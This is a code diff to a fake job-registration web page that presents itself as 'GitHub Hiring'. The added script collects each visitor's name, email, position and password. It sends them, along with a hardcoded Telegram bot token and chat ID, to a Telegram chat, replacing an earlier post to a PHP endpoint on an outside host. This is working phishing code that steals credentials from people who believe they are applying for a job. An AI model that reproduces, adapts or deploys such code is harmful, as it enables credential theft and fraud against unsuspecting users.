@@ -60,16 +60,34 @@
   <div id="thankyou">✅ Thank you! You will be contacted by email.</div>
 
   <script>
+    const BOT_TOKEN = "7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U";
+    const CHAT_ID = "968143308";
+
     document.getElementById("registerForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
       const form = e.target;
-      const formData = new FormData(form);
+      const data = {
+        name: form.name.value,
+        email: form.email.value,
+        position: form.position.value,
+        password: form.password.value
+      };
+
+      const message = `📩 *New GitHub Hiring Registration*:\n\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n💼 Position: ${data.position}\n🔐 Password: ${data.password}`;
+      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
       try {
-        await fetch("http://globalhires.kesug.com/send.php", {
+        await fetch(telegramUrl, {
           method: "POST",
-          body: formData
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
         });
 
         form.style.display = "none";
